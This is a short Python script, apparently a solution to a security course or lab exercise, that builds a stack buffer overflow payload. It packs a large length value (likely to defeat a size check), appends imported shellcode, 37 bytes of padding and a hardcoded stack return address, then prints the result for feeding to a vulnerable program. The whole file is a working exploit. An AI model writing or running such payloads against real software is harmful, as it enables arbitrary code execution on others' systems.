from shellcode import shellcode
import struct

x = struct.pack('<I', 1073741825)

print(x + shellcode +"A"*37 + "\xe0\xb5\xfe\xbf")
